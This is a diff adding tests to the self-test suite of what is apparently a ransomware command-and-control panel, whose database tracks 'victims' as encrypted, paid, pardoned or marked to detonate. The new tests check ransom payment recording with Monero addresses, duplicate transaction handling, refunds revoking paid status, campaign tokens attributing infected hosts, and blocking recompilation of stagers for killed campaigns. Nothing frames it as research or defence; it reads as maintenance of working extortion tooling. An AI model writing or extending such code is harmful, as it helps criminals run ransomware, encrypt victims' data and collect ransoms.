@@ -325,6 +325,11 @@ with c2db.db() as conn:
     st = conn.execute("SELECT status, output FROM commands WHERE id=?", (cid,)).fetchone()
 ok("command output stored", st and st["status"] == "done" and st["output"] == "box-leo")
 
+with c2db.db() as conn:
+    # The shared fixture was pardoned above; payments belong to live victims.
+    conn.execute("UPDATE victims SET status='encrypted', pardon=0 WHERE vid=?",
+                 (vid,))
+    conn.commit()
 r = post("/admin/payments", {"vid": vid, "amount": "100", "note": "deposit"})
 ok("payment recorded", r.status_code == 302 and c2db.payments_total(vid) >= 100)
 
@@ -619,6 +624,13 @@ with c2db.db() as conn:
 r = post("/admin/payments/check")
 ok("payment routed", r.status_code == 302)
 ok("payment marked paid", c2db.get_victim(vid)["status"] == "paid")
+with c2db.db() as conn:
+    conn.execute("UPDATE victims SET detonate=1 WHERE vid=?", (vid,))
+    conn.commit()
+ok("paid victim ignores stale detonate", ping(vid) == "sleep")
+with c2db.db() as conn:
+    conn.execute("UPDATE victims SET detonate=0 WHERE vid=?", (vid,))
+    conn.commit()
 
 # the same txid must not pay a second victim sharing the address
 vid2 = "paydup0000000001"
@@ -634,6 +646,9 @@ with c2db.db() as conn:
     n = conn.execute("SELECT COUNT(*) FROM payments WHERE txid=?",
                      ("selftest-tx-0001",)).fetchone()[0]
 ok("one ledger row per txid", n == 1)
+r = post("/admin/payments", {"vid": vid, "amount": "1",
+                             "txid": "selftest-tx-0001"})
+ok("duplicate manual txid is rejected cleanly", r.status_code == 302)
 
 # ---- roles ---------------------------------------------------------------
 post("/admin/operators", {"username": "viewer1", "password": "viewerpass1",
@@ -778,6 +793,14 @@ ok("campaign created", bool(camps))
 cid = camps[0]["id"] if camps else 0
 post("/admin/update", {"vid": vid, "update_type": "campaign", "campaign_id": str(cid)})
 ok("campaign assigned", c2db.get_victim(vid)["campaign_id"] == cid)
+
+cid_tok = c2db.create_campaign("TokenCamp", config=json.dumps({"token": "tok-test-123"}))
+tok_vid = "tokenvictim00001"
+r = CL.post("/api/checkin", data={"vid": tok_vid, "key": wrapped, "host": "TOKBOX"},
+            headers={"X-Vex-Token": "tok-test-123"})
+ok("campaign token accepted", r.status_code == 200)
+ok("campaign token attributes victim",
+   c2db.get_victim(tok_vid)["campaign_id"] == cid_tok)
 r = post("/admin/campaign/%d/build" % cid, {})
 body = r.get_json() or {}
 ok("campaign build json", r.status_code == 200 and len(body.get("sha256", "")) == 64)
@@ -888,6 +911,15 @@ if ups:
 before_total = c2db.payments_total(vid)
 post("/admin/refund/%s" % vid, {"amount": "10", "note": "test refund"})
 ok("refund recorded", abs(c2db.payments_total(vid) - (before_total - 10)) < 0.01)
+_ref_vid = "refundlogic00001"
+with c2db.db() as conn:
+    conn.execute("INSERT OR REPLACE INTO victims (vid, status, price, timestamp, "
+                 "deadline) VALUES (?,?,?,?,?)",
+                 (_ref_vid, "encrypted", 100.0, c2db.now(), ""))
+    conn.commit()
+c2db.add_payment(_ref_vid, 100.0, "full", "refund-tx-1", "admin", "")
+c2db.add_payment(_ref_vid, -100.0, "full refund", "", "admin", "")
+ok("refund revokes paid status", c2db.get_victim(_ref_vid)["status"] != "paid")
 
 c2db.set_setting("xmr_addresses", "4AddrPoolA\n4AddrPoolB")
 original_xmr = c2db.get_victim(vid)["xmr_address"]
@@ -1178,6 +1210,10 @@ ok("campaign deactivated", (camp["active"] or 0) == 0
 ok("build revoked", bld["status"] == "revoked" and not bld["stager_path"])
 ok("build file removed", not os.path.exists(nuke_stager))
 ok("campaign victim killed", (nv["detonate"] or 0) == 2)
+_before = len(c2db.list_campaign_builds(cid))
+r = post("/admin/campaign/%d/compile" % cid, {})
+ok("nuked campaign cannot be recompiled", r.status_code == 302
+   and len(c2db.list_campaign_builds(cid)) == _before)
 shutil.rmtree(nuke_dir, ignore_errors=True)
 
 import importlib.util as _ilu
